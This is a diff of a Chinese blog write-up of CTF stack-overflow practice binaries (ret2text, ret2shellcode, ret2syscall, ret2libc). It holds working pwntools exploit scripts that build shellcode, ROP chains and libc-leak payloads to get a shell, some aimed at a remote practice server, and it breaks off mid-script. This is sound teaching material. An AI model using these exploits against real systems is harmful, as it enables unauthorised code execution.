@@ -182,7 +182,7 @@
 <p>附言：所有的学习均在本地测试，远程可以使用socat或者docker部署</p>
 <span id="more"></span>
 
-<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>保护检查</p>
+<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p><strong>保护检查</strong></p>
 <p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191107953.png" alt="image-20220615191107953"></p>
 <p>32位，开启NX保护。</p>
 <p>查看调用的函数</p>
@@ -198,6 +198,7 @@
 <p>可以造成溢出的gets函数</p>
 <p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615200638390.png" alt="image-20220615200638390"></p>
 <p>需要计算s相对于返回地址的偏移，可以使用gdb动态调试得到，也可以直接利用ida给出的偏移值计算(这个方法在主函数使用时候经常是给出的偏移是错误的)</p>
+<p><strong>调试</strong></p>
 <p><strong>使用gdb动态调试：</strong></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2text			<span class="comment">#使用gdb调试程序文件</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x080486AE	<span class="comment">#在gets函数指向前下断点，地址是之前在ida中看到的</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; info reg		<span class="comment">#显示寄存器的值，主要看的是esp和ebp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -208,13 +209,225 @@
 
 
 
-<p>攻击思路：</p>
+<p><strong>攻击思路</strong></p>
 <p>利用gets函数进行栈溢出，并且修改返回的地址</p>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2text&#x27;)</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)			<span class="comment">#计算的偏移，需要填充垃圾数据</span></span><br><span class="line">shellc=<span class="number">0x0804863A</span>			<span class="comment">#记录在ida找到的system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload=junk+p32(shellc)	<span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)		<span class="comment">#发送构造好的payload</span></span><br><span class="line">io.interactive()			<span class="comment">#与远程进行交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*									<span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment">#调试相关信息</span></span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)										#远程访问，需要自己挂上去</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2text&#x27;</span>)							<span class="comment">#本地访问</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2text&#x27;)								#导入本地文件</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#计算的偏移，需要填充垃圾数据</span></span><br><span class="line">shellc=<span class="number">0x0804863A</span>									<span class="comment">#记录在ida找到的system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload=junk+p32(shellc)							<span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)								<span class="comment">#发送构造好的payload</span></span><br><span class="line">io.interactive()									<span class="comment">#与远程进行交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>拿到shell</p>
 <p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615204942903.png" alt="image-20220615204942903"></p>
+<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616163235776.png" alt="image-20220616163235776" style="zoom:80%;" />
+
+<p>32位，没有开启保护，说明栈上可执行</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616163318074.png" alt="image-20220616163318074" style="zoom:80%;" />
+
+<p>可以看到一些经常利用的函数，如gets…</p>
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164235497.png" alt="image-20220616164235497" style="zoom:80%;" />
+
+<p>可以造成溢出的gets函数(因为gets没有设置字符串长度)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164317442.png" alt="image-20220616164317442" style="zoom:80%;" />
+
+<p>看主函数，可以知道当输入完s(长度为100)后，使用strncpy把s的数据复制到buf2，因为buf2没有在主函数中设出来，所以应该是一个全局变量，未初始化的全局变量一般保存在bss段中，双击buf2变量，看一下</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164947894.png" alt="image-20220616164947894" style="zoom:80%;" />
+
+
+
+<p><strong>使用gdb调试看看</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2shellcode 		<span class="comment">#启动gdb</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b main			<span class="comment">#在主函数处下断点</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap			<span class="comment">#查看当前程序的系统调用库</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616165950043.png" alt="image-20220616165950043" style="zoom:80%;" />
+
+<p>由ida中的bss地址看到所属的区域(在第一行里)是具有可执行的权限的。</p>
+<p>通过主函数可以知道把s的数据复制到buf2这个可以执行的bss段上，复制的大小是0x64，0x64-0x1C&#x3D;0x48&#x3D;72，大小足够了，直接使用pwntools提供的函数即可，可以看一下pwntools中构造 shellcode的字符串长度</p>
+<p>这个是32位的shellc</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616171527851.png" alt="image-20220616171527851" style="zoom:80%;" />
+
+<p>这个是64位的shellc</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616171732498.png" alt="image-20220616171732498" style="zoom:80%;" />
+
+<p>对于偏移的计算，跟上面的ret2text原理一样</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2shellcode		<span class="comment">#使用gdb调试程序文件</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x08048593	<span class="comment">#在gets函数指向前下断点，地址是之前在ida中看到的</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; info reg		<span class="comment">#显示寄存器的值，主要看的是esp和ebp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616190029416.png" alt="image-20220616190029416" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp            0xffffcef0          </span><br><span class="line">ebp            0xffffcf78   </span><br><span class="line">s=esp+0x1c=ffffcf0c</span><br><span class="line">s相对于esp的偏移：ebp-s=0x6c</span><br><span class="line">=&gt;s相对于返回地址的偏移：0x6c+4</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>攻击思路</strong></p>
+<p>利用gets函数造成栈溢出修改返回地址为buf2的地址，在s中填充shellcode(需要填满，空余的用其他垃圾数据填充)</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*									<span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment">#调试的相关信息</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)					<span class="comment">#远程访问</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./ret2shellcode&#x27;)						#本地访问，这题不知道为啥打不通</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2shellcode&#x27;)							#导入文件</span></span><br><span class="line"></span><br><span class="line">shellc=asm(shellcraft.sh())							<span class="comment">#调用系统函数自动生成</span></span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span>								<span class="comment">#buf2的地址，让返回地址修改为这个</span></span><br><span class="line"></span><br><span class="line">payload=shellc.ljust(<span class="number">0x6c</span>+<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf2_addr)	<span class="comment">#构造payload</span></span><br><span class="line">io.sendline(payload)								<span class="comment">#发送</span></span><br><span class="line">io.interactive()									<span class="comment">#与远程交互</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617165203505.png" alt="image-20220617165203505" style="zoom:80%;" />
+
+
+
+<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616194848607.png" alt="image-20220616194848607" style="zoom:80%;" />
+
+<p>32位，开启了NX保护</p>
+<p>ida查看程序文件</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617102809148.png" alt="image-20220617102809148" style="zoom:80%;" />
+
+<p>看到了危险函数gets函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617105411878.png" alt="image-20220617105411878" style="zoom:80%;" />
+
+<p>跟前面一样，动调算一下偏移值</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617105536928.png" alt="image-20220617105536928" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp            0xffffcf30         </span><br><span class="line">ebp            0xffffcfb8 </span><br><span class="line">v4---&gt;esp+0x1c=0xffffcf4c</span><br><span class="line">v4相对于ebp偏移---&gt;offset=0x6c</span><br><span class="line">因为是32位，故v4相对于返回地址的偏移---&gt;0x6c+4</span><br></pre></td></tr></table></figure>
+
+<p>可以利用系统调用来获取shell，比较常用的是下面这个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br><span class="line">系统调用号，即 eax 应该为 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br></pre></td></tr></table></figure>
+
+<p>对于对应的参数，可以借鉴这个网站：<a href="https://publicki.top/old/syscall.html">https://publicki.top/old/syscall.html</a></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617112104732.png" alt="image-20220617112104732" style="zoom:80%;" />
+
+<p>使用ROPgadget查找gadgets</p>
+<p>eax的gadgets</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617160518058.png" alt="image-20220617160518058" style="zoom:80%;" />
+
+<p>使用我选中的那一行可以直接对ebx、ecx、edx进行赋值</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617160816757.png" alt="image-20220617160816757" style="zoom:80%;" />
+
+<p>&#x2F;bin&#x2F;sh这个字符串的地址</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617161022248.png" alt="image-20220617161022248" style="zoom:80%;" />
+
+<p>int 0x80的地址</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617161107749.png" alt="image-20220617161107749" style="zoom:80%;" />
+
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./rop&#x27;)</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#之前计算的需要填充的偏移</span></span><br><span class="line">pop_eax=<span class="number">0x080bb196</span>									<span class="comment">#eax,ret</span></span><br><span class="line">pop_e3x=<span class="number">0x0806eb90</span>									<span class="comment">#edx,ecx,ebx,ret</span></span><br><span class="line">bin_sh=<span class="number">0x080be408</span>									<span class="comment">#/bin/sh				</span></span><br><span class="line">int_0x80=<span class="number">0x08049421</span>									<span class="comment">#int 0x80</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(pop_eax)+p32(<span class="number">0x0b</span>)+p32(pop_e3x)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_0x80)										   <span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617165348158.png" alt="image-20220617165348158" style="zoom:80%;" />
+
+
+
+<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617202842455.png" alt="image-20220617202842455" style="zoom:80%;" />
+
+<p>32位，开启NX检查</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203134019.png" alt="image-20220617203134019" style="zoom:80%;" />
+
+<p>查看调用了的一些函数，可以看到gets、system函数</p>
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203657889.png" alt="image-20220617203657889" style="zoom: 80%;" />
+
+<p>发现可以造成溢出的gets寒素</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203738980.png" alt="image-20220617203738980" style="zoom:80%;" />
+
+<p>在plt表中可以看到调用了system函数(在初始页面按ctrl+s选择plt表跳转)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204005123.png" alt="image-20220617204005123" style="zoom:80%;" />
+
+<p>在查看字符串的时候(shift+f12)，发现字符串&#x2F;bin&#x2F;sh</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204301525.png" alt="image-20220617204301525" style="zoom:80%;" />
+
+<p>现在整理一下可以利用的东西：可以造成溢出的gets函数、系统调用函数system以及字符串&#x2F;bin&#x2F;sh</p>
+<p>除了可以通过ida直接查看字符串的地址，还可以通过ROPgadget</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617205228929.png" alt="image-20220617205228929" style="zoom:80%;" />
+
+
+
+<p>计算s和返回地址的偏移(方法和前面一样)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204730342.png" alt="image-20220617204730342" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp            0xffffcf10       </span><br><span class="line">ebp            0xffffcf98</span><br><span class="line"></span><br><span class="line">s:esp+0x1c=0xffffcf2c</span><br><span class="line">s相对于ebp的偏移：offset=ebp-s=0x6c</span><br><span class="line">s相对于返回地址的偏移：0x6c+4</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>攻击思路</strong></p>
+<p>利用gets函数的栈溢出修改返回地址并使之执行system(“&#x2F;bin&#x2F;sh”)，拿到shell</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#需要填充的垃圾数据</span></span><br><span class="line">bin_sh=<span class="number">0x08048720</span>									<span class="comment">#先前查询的地址</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]						<span class="comment">#可以使用pwntools库中的函数直接查找，也可以像下面这样把ida中找到的直接写出来</span></span><br><span class="line"><span class="comment">#system=0x08048460</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(system_plt)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(bin_sh)	<span class="comment">#构造payload，中间加了b&#x27;bbbb&#x27;是因为在调用函数的时候，同时需要一个对应的返回地址，这里的b&#x27;bbbb&#x27;作为虚假的地址，因为此时已经拿到了shell</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210035884.png" alt="image-20220617210035884" style="zoom:80%;" />
+
+
+
+<h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210220822.png" alt="image-20220617210220822" style="zoom:80%;" />
+
+<p>和例1一样，32位，开启NX保护</p>
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210500398.png" alt="image-20220617210500398" style="zoom:80%;" />
+
+<p>可以造成栈溢出的gets函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617212503114.png" alt="image-20220617212503114" style="zoom:80%;" />
+
+<p>查看字符串(shift+f12)，和第一题相比，可以看到没有了字符串&#x2F;bin&#x2F;sh</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210556495.png" alt="image-20220617210556495" style="zoom:80%;" />
+
+<p>在plt表中可以找到system函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211320710.png" alt="image-20220617211320710" style="zoom:80%;" />
+
+<p>在bss段可以找到一个连续的空间，并且动调发现bss段可执行</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211915506.png" alt="image-20220617211915506" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211848614.png" alt="image-20220617211848614" style="zoom:80%;" />
+
+<p>计算s和返回地址的偏移</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; info reg</span><br><span class="line">eax            0xffffcf2c          -12500</span><br><span class="line">ecx            0xffffffff          -1</span><br><span class="line">edx            0x13                19</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">esp            0xffffcf10          0xffffcf10</span><br><span class="line">ebp            0xffffcf98          0xffffcf98</span><br><span class="line">esi            0xf7fb2000          -134537216</span><br><span class="line">edi            0xf7fb2000          -134537216</span><br><span class="line">eip            0x80486ba           0x80486ba &lt;main+114&gt;</span><br><span class="line">eflags         0x286               [ PF SF IF ]</span><br><span class="line">cs             0x23                35</span><br><span class="line">ss             0x2b                43</span><br><span class="line">ds             0x2b                43</span><br><span class="line">es             0x2b                43</span><br><span class="line">fs             0x0                 0</span><br><span class="line">gs             0x63                99</span><br><span class="line"></span><br><span class="line">s相对于返回地址的偏移:ebp-(esp+0x1c)+4=0x6c+4</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击思路</strong></p>
+<p>和例1很像，不过缺少字符串&#x2F;bin&#x2F;sh，故可以调用gets函数把字符串&#x2F;bin&#x2F;sh写道bss段上，然后修改返回地址执行system(“&#x2F;bin&#x2F;sh”)</p>
+<p>buf2的地址</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617214054803.png" alt="image-20220617214054803" style="zoom:80%;" />
+
+<p>pop_ebx</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617214223568.png" alt="image-20220617214223568" style="zoom:80%;" />
+
+
+
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)							</span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span>						</span><br><span class="line">pop_ebx=<span class="number">0x0804843d</span></span><br><span class="line">gets_plt=elf.plt[<span class="string">&#x27;gets&#x27;</span>]					<span class="comment">#可以这样直接调用函数，也可以在ida中查</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]				<span class="comment">#同上</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(gets_plt)+p32(pop_ebx)+p32(buf2_addr)+p32(system_plt)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(buf2_addr)								<span class="comment">#这里的pop主要是为了返回用的进而执行system函数</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>关于payloa的构造，wiki上面没有详细说明，为了方便理解，画了一张流程图</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/ret2libc2_01.png" alt="ret2libc2_01" style="zoom:80%;" />
+
+<p>我先开始也看不太明白，请教了高师傅后才理解的，后来高师傅还给我推荐了一个构造payload的方法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span> + p32(gets_plt) + p32(sys_plt) + p32(buf2)+p32(buf2)</span><br></pre></td></tr></table></figure>
+
+<p>这个在栈上的分布如下图所示</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617224122737.png" alt="image-20220617224122737" style="zoom:80%;" />
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617221719649.png" alt="image-20220617221719649" style="zoom:80%;" />
+
+
+
+<h2 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h2><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102115483.png" alt="image-20220618102115483" style="zoom:80%;" />
+
+<p>32位，开启NX保护</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102235365.png" alt="image-20220618102235365" style="zoom:80%;" />
+
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102436248.png" alt="image-20220618102436248" style="zoom:80%;" />
+
+<p>发现危险函数gets函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102526005.png" alt="image-20220618102526005" style="zoom:80%;" />
+
+<p>计算s和返回地址的偏移(方法和之前一样)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; info reg</span><br><span class="line">eax            0xffffcf2c          -12500</span><br><span class="line">ecx            0xffffffff          -1</span><br><span class="line">edx            0x12                18</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">esp            0xffffcf10          0xffffcf10</span><br><span class="line">ebp            0xffffcf98          0xffffcf98</span><br><span class="line">esi            0xf7fb2000          -134537216</span><br><span class="line">edi            0xf7fb2000          -134537216</span><br><span class="line">eip            0x804868a           0x804868a &lt;main+114&gt;</span><br><span class="line">eflags         0x286               [ PF SF IF ]</span><br><span class="line">cs             0x23                35</span><br><span class="line">ss             0x2b                43</span><br><span class="line">ds             0x2b                43</span><br><span class="line">es             0x2b                43</span><br><span class="line">fs             0x0                 0</span><br><span class="line">gs             0x63                99</span><br><span class="line"></span><br><span class="line">s相对于返回地址的偏移:offset=ebp-(esp+0x1c)+4=0x6c+4</span><br></pre></td></tr></table></figure>
+
+<p>程序中可以利用的最明显的就是gets函数的溢出。</p>
+<p><strong>攻击思路</strong></p>
+<p>利用gets函数的溢出泄露出libc版本，进而获取到system地址和&#x2F;bin&#x2F;sh地址，再次执行程序出发栈溢出执行system(“&#x2F;bin&#x2F;sh”)</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ret2libc3&#x27;)							#我得本地打不出来，应该和Ubuntu版本有关</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]							<span class="comment">#利用puts函数打印出需要打印的函数的got地址</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]							<span class="comment">#随便选取一个libc库中调用的函数即可，我这里选的是puts的	</span></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]								<span class="comment">#main函数地址</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(puts_plt)+p32(main)+p32(puts_got)	<span class="comment">#构造payload，这里修改返回调用为puts(puts_got)，puts函数的返回地址为主函数，方便泄露完成后构造shellc获取shell</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])			<span class="comment">#一般got地址是以\xf7开头，也可以像网上那样写，如下</span></span><br><span class="line"><span class="comment">#puts_addr=u32(sh.recv()[0:4])</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr---&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))		<span class="comment">#打印出来看看</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)					<span class="comment">#利用库查找出libc</span></span><br><span class="line">base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span 